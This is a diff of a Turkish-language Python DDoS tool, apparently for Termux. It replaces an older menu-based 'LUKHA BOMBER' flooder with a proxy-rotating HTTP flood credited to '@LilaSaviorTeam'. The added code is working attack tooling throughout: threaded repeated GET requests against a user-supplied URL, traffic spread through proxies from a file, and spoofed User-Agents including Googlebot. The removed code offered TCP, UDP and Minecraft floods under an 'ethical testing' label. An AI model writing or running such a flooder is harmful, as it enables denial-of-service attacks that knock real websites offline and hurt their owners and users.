@@ -1,116 +1,128 @@
-#!/usr/bin/python3
 import os
 import sys
 import time
+import random
+import threading
+import requests
+from datetime import datetime
 
-BANNER = """
-\033[91m
-  _      _____ _   _ _______ _____  
- | |    |_   _| \ | |__   __|  __ \ 
- | |      | | |  \| |  | |  | |__) |
- | |      | | | . ` |  | |  |  ___/ 
- | |____ _| |_| |\  |  | |  | |     
- |______|_____|_| \_|  |_|  |_|     
-\033[0m
-\033[93m>>> Etik test amacli ddos <<<\033[0m
-"""
+# Renkli çıktılar
+class colors:
+    HEADER = '\033[95m'
+    BLUE = '\033[94m'
+    CYAN = '\033[96m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    RESET = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
 
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
+# Banner
+def show_banner():
+    os.system('clear')
+    print(f"""{colors.HEADER}
+    ██╗     ██╗██╗  ██╗ █████╗     ██████╗ ██████╗ ██████╗ ██╗   ██╗
+    ██║     ██║██║  ██║██╔══██╗    ██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
+    ██║     ██║███████║███████║    ██║  ██║██████╔╝██║  ██║ ╚████╔╝ 
+    ██║     ██║██╔══██║██╔══██║    ██║  ██║██╔══██╗██║  ██║  ╚██╔╝  
+    ███████╗██║██║  ██║██║  ██║    ██████╔╝██║  ██║██████╔╝   ██║   
+    ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═════╝    ╚═╝   
+    {colors.CYAN}
+    Termux için Proxy Destekli DDoS Aracı v3.0
+    {colors.YELLOW}Developer: @LilaSaviorTeam | Lila için mücadele!
+    {colors.RESET}""")
 
-def print_banner():
-    print(BANNER)
+# Proxy yükleme
+def load_proxies():
+    proxies = []
+    try:
+        with open('proxy.txt', 'r') as f:
+            for line in f:
+                line = line.strip()
+                if line:
+                    proxies.append({
+                        'http': f'http://{line}',
+                        'https': f'http://{line}'
+                    })
+        if not proxies:
+            print(f"{colors.YELLOW}[!] proxy.txt boş, direkt bağlantı kullanılacak{colors.RESET}")
+            return None
+        return proxies
+    except FileNotFoundError:
+        print(f"{colors.YELLOW}[!] proxy.txt bulunamadı, direkt bağlantı kullanılacak{colors.RESET}")
+        return None
 
-def print_menu():
-    print("\033[91m╔══════════════════════════╗")
-    print("\033[91m║      \033[93mLUKHA BOMBER\033[91m        ║")
-    print("\033[91m╠══════════════════════════╣")
-    print("\033[91m║ \033[95m1.\033[91m \033[97mDDoS Saldırısı Başlat \033[91m║")
-    print("\033[91m║ \033[95m2.\033[91m \033[97mGereksinimleri Yükle  \033[91m║")
-    print("\033[91m║ \033[95m3.\033[91m \033[97mÇıkış                 \033[91m║")
-    print("\033[91m╚══════════════════════════╝\033[0m")
-
-def print_attack_types():
-    print("\n\033[93mHedef türünü seçin:\033[0m")
-    print("\033[94m1.\033[0m Site (HTTP Flood)")
-    print("\033[94m2.\033[0m TCP Flood")
-    print("\033[94m3.\033[0m UDP Flood")
-    print("\033[94m4.\033[0m Minecraft Sunucusu")
-
-def install_requirements():
-    print("\n\033[93mGereksinimler yükleniyor...\033[0m")
-    os.system("pip install pysocks")
-    print("\033[92mYükleme tamamlandı!\033[0m")
-    input("Devam etmek için Enter'a basın...")
-
-def get_input(prompt, default=None, is_int=False, allow_zero=False):
-    while True:
-        val = input(f"\033[96m{prompt}\033[0m").strip()
-        if val == "" and default is not None:
-            return default
-        if is_int:
-            if val.isdigit():
-                iv = int(val)
-                if iv > 0 or (allow_zero and iv == 0):
-                    return iv
-            print("\033[91mLütfen geçerli pozitif bir sayı girin (0 sonsuz için geçerli).\033[0m")
-        else:
-            return val
-
-def main():
-    while True:
-        clear_screen()
-        print_banner()
-        print_menu()
-        choice = input("\n\033[95mSeçiminiz (1-3): \033[0m").strip()
-
-        if choice == "1":
-            target = get_input("Hedef IP veya Domain (örnek: example.com): ")
-            port = get_input("Port numarası (default 80): ", default=80, is_int=True)
-            threads = get_input("Thread sayısı (default 200): ", default=200, is_int=True)
-            total_requests = get_input("Toplam gönderilecek paket sayısı (0 = sonsuz): ", is_int=True, allow_zero=True)
-
-            print_attack_types()
-            attack_choice = input("\033[95mSeçiminiz (1-4): \033[0m").strip()
-
-            if attack_choice == "1":
-                attack_target = "http"
-            elif attack_choice == "2":
-                attack_target = "tcp"
-            elif attack_choice == "3":
-                attack_target = "udp"
-            elif attack_choice == "4":
-                attack_target = "minecraft"
-                if port == 80:
-                    port = 25565
+# Saldırı fonksiyonu
+def attack(target, thread_id, proxies, user_agents):
+    while not stop_flag:
+        try:
+            proxy = random.choice(proxies) if proxies else None
+            headers = {'User-Agent': random.choice(user_agents)}
+            
+            start_time = time.time()
+            response = requests.get(
+                target,
+                proxies=proxy,
+                headers=headers,
+                timeout=5
+            )
+            latency = int((time.time() - start_time) * 1000)
+            
+            if response.status_code == 200:
+                print(f"{colors.GREEN}[+] Thread-{thread_id} {proxy['http'] if proxy else 'DIRECT'} → {latency}ms {datetime.now().strftime('%H:%M:%S')}{colors.RESET}")
             else:
-                print("\033[91mGeçersiz seçim! Ana menüye dönülüyor...\033[0m")
-                time.sleep(1.5)
-                continue
-
-            proxy_type = input("\033[96mProxy tipi (socks4/socks5, default socks5): \033[0m").strip().lower() or "socks5"
-
-            try:
-                from lukha import LukhaBomber
-            except ImportError:
-                print("\033[91mlukha.py dosyası bulunamadı! Aynı klasörde olduğundan emin olun.\033[0m")
-                input("Devam etmek için Enter'a basın...")
-                continue
-
-            bomber = LukhaBomber(target, port, threads, total_requests, proxy_type, attack_target)
-            print("\n\033[93mSaldırı başlatılıyor... Ctrl+C ile durdurabilirsiniz.\033[0m")
-            bomber.start()
-            input("\nDevam etmek için Enter'a basın...")
-
-        elif choice == "2":
-            install_requirements()
-        elif choice == "3":
-            print("\033[93mProgramdan çıkılıyor...\033[0m")
+                print(f"{colors.YELLOW}[!] Thread-{thread_id} Code {response.status_code} {datetime.now().strftime('%H:%M:%S')}{colors.RESET}")
+                
+        except Exception as e:
+            print(f"{colors.RED}[-] Thread-{thread_id} Error: {str(e)[:50]}{colors.RESET}")
             time.sleep(1)
-            sys.exit()
-        else:
-            print("\033[91mGeçersiz seçim! Lütfen 1 ile 3 arasında bir sayı girin.\033[0m")
-            time.sleep(1.5)
+
+# Ana program
+def main():
+    global stop_flag
+    stop_flag = False
+    
+    show_banner()
+    
+    # Ayarlar
+    target_url = input(f"{colors.BLUE}[?] Hedef URL: {colors.RESET}").strip()
+    thread_count = int(input(f"{colors.BLUE}[?] Thread Sayısı (1-100): {colors.RESET}") or 50)
+    
+    # Proxy ve User-Agent yükle
+    proxies = load_proxies()
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
+        "Googlebot/2.1 (+http://www.google.com/bot.html)"
+    ]
+    
+    # Saldırıyı başlat
+    print(f"\n{colors.CYAN}[!] {thread_count} thread ile saldırı başlatılıyor...{colors.RESET}")
+    print(f"{colors.CYAN}[!] Durdurmak için CTRL+C{colors.RESET}\n")
+    
+    threads = []
+    for i in range(thread_count):
+        t = threading.Thread(
+            target=attack,
+            args=(target_url, i+1, proxies, user_agents),
+            daemon=True
+        )
+        threads.append(t)
+        t.start()
+    
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        stop_flag = True
+        print(f"\n{colors.RED}[!] Saldırı durduruluyor...{colors.RESET}")
+        
+        for t in threads:
+            t.join(1)
+        
+        print(f"\n{colors.GREEN}[+] Lila için mücadele sona erdi!{colors.RESET}")
+        sys.exit(0)
 
 if __name__ == "__main__":
     main()
